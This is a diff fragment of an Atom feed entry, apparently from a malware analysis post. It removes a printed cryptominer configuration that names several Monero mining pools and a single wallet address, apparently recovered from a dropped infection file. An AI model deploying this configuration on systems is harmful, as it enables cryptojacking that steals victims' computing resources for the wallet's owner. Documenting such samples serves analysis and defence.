-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
-    &quot;algo&quot;: &quot;cryptonight&quot;,
-    &quot;api&quot;: {
-        &quot;port&quot;: 0,
-        &quot;access-token&quot;: null,
-        &quot;worker-id&quot;: null,
-        &quot;ipv6&quot;: false,
-        &quot;restricted&quot;: true
-    },
-    &quot;av&quot;: 0,
-    &quot;background&quot;: false,
-    &quot;colors&quot;: true,
-    &quot;cpu-affinity&quot;: null,
-    &quot;cpu-priority&quot;: null,
-    &quot;donate-level&quot;: 1,
-    &quot;huge-pages&quot;: true,
-    &quot;hw-aes&quot;: null,
-    &quot;log-file&quot;: null,
-    &quot;max-cpu-usage&quot;: 75,
-    &quot;pools&quot;: [
-        {
-            &quot;url&quot;: &quot;sg.minexmr.com:4444&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;sg.minexmr.com:80&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;sg.minexmr.com:443&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;pool.minexmr.com:4444&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;pool.minexmr.com:80&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;pool.minexmr.com:443&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;xmr-usa.dwarfpool.com:8005 &quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;xmr-usa.dwarfpool.com:8080&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;pool.monero.hashvault.pro:443&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;pool.monero.hashvault.pro:443&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        }
-    ],
-    &quot;print-time&quot;: 600,
-    &quot;retries&quot;: 3,
-    &quot;retry-pause&quot;: 3,
-    &quot;safe&quot;: false,
-    &quot;threads&quot;: null,
-    &quot;user-agent&quot;: null,
-    &quot;watch&quot;: false
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Initial file dropped was a Bash file containing following commands:</summary></entry></feed>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Initial file dropped</summary></entry></feed>
